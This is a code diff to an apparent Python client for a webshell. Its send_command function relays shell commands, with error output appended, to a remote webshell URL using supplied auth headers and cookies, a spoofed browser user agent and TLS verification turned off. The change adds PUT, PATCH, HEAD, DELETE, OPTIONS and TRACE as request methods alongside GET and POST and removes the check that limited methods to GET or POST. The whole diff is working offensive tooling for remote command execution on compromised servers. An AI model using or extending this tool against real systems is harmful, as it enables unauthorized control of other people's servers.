@@ -64,17 +64,22 @@ def is_error_output(output):
 
 def send_command(command, webshell, method, param="code"):
     headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
-    "Authorization":AUTH, "Cookie":COOKIES, "Content-Type":"application/x-www-form-urlencoded"}
+    "Authorization": AUTH, "Cookie":COOKIES, "Content-Type":"application/x-www-form-urlencoded"}
     command = command + " 2>&1"
     params = {param.strip():command.strip()}
     if NOENC:
         params = urllib.parse.urlencode(params, safe='|!"#$%&/()=?,.-;:_][]}{><')
     else:
         params = urllib.parse.urlencode(params, safe='')
-    if (method.upper() == "GET"):
-        response = requests.get((webshell), params=params, headers=headers, verify=False)
-    elif (method.upper() == "POST"):
-        response = requests.post((webshell), data=params, headers=headers, verify=False)
+    method = method.upper()
+    if method == "GET":
+        response = requests.get(webshell, params=params, headers=headers, verify=False)
+    elif method == "POST":
+        response = requests.post(webshell, data=params, headers=headers, verify=False)
+    elif method in ("PUT", "PATCH"):
+        response = requests.request(method, webshell, data=params, headers=headers, verify=False)
+    elif method in ("HEAD", "DELETE", "OPTIONS", "TRACE"):
+        response = requests.request(method, webshell, params=params, headers=headers, verify=False)
     return response.content.decode(errors="ignore")
 
 def show_help():
@@ -155,11 +160,6 @@ if __name__ == "__main__":
         i += 1
 
     if not WEBSHELL or not HTTP_METHOD:
-        show_help()
-        sys.exit(1)
-
-    if HTTP_METHOD.upper() not in ["GET", "POST"]:
-        print(colored("[!] Error: METHOD must be GET or POST\n", "red"))
         show_help()
         sys.exit(1)
 
